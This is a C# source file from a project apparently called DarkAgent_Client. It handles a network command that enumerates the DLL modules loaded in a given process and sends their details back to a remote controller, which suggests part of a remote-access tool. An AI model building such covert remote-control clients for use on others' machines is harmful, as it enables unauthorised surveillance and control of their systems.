using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using DarkAgent_Client.src.Objects;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Send;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    class R_GetProcessDLLs : ReceiveBasePacket
    {
        public R_GetProcessDLLs(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        private int PID;
        public override void Read()
        {
            PID = ReadInteger();
        }

        public override void Run()
        {
            try
            {
                Process proc = Process.GetProcessById(PID);
                for (int i = 0; i < proc.Modules.Count; i++)
                {
                    ProcessDllInfo info = new ProcessDllInfo();
                    info.PID = PID;
                    info.FileName = proc.Modules[i].FileName.ToString();
                    info.ModuleName = proc.Modules[i].ModuleName.ToString();
                    info.BaseAddress = proc.Modules[i].BaseAddress.ToString();
                    info.EntryPointAddress = proc.Modules[i].EntryPointAddress.ToString();
                    info.ModuleMemorySize = proc.Modules[i].ModuleMemorySize.ToString();
                    Client.SendPacket(new S_GetProcessDLLs(Client, info));
                }
            }catch{}
        }
    }
}
